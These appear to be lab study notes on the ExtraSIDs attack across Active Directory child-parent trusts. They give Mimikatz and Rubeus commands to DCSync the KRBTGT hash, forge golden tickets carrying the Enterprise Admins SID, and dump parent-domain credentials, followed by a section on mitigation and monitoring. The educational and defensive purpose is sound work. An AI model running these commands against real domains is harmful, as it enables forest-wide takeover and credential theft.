# Attacking Domain Trusts - Child-Parent Trusts (Windows)

## SID History Primer

### Purpose
Used during AD migrations so a migrated user can still access resources in the original domain.

### Mechanism
The original SID is placed in the `sidHistory` attribute of the migrated account.

### Abuse Potential
Attackers can inject privileged SIDs (e.g., Enterprise Admins) into `sidHistory` to escalate privileges.

---

## ExtraSIDs Attack (Mimikatz)

### Concept
Abuses missing SID filtering inside a forest.  
Injects the **Enterprise Admins** SID into a forged ticket to gain Enterprise Admin privileges.

### Requirements
- KRBTGT hash of the child domain  
- Child domain SID  
- Target username (can be nonexistent)  
- Child domain FQDN  
- Enterprise Admins SID of the parent domain  

### Steps

#### 1. Obtain KRBTGT hash
```mimikatz
lsadump::dcsync /user:LOGISTICS\krbtgt
```

#### 2. Get child domain SID

```powershell
Get-DomainSID
```

#### 3. Get Enterprise Admins SID

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

or

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

#### 4. Forge ticket with ExtraSIDs

```mimikatz
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### 5. Verify ticket

```cmd
klist
```

#### 6. Access parent domain resources

```cmd
dir \\academy-ea-dc01.inlanefreight.local\c$
```

---

## ExtraSIDs Attack (Rubeus)

### Execute

```cmd
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### Verify

```cmd
klist
```

### Perform privileged operations

```mimikatz
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---

## Mitigation

### Enable SID Filtering

Prevents SID injection across trusts.

```cmd
netdom trust TrustingDomain /domain:TrustedDomain /quarantine:yes
```

### Monitor SID History Modifications

Watch for:

* Event ID **4765** (SID history added)
* Event ID **4766** (SID history removed)

### Restrict Privileged Groups

Minimize membership in Enterprise Admins and Domain Admins.

### Tiered Administration

Limit high-value accounts to hardened admin workstations.

### Audit Trusts Regularly

Identify unnecessary or insecure inter-domain trusts.
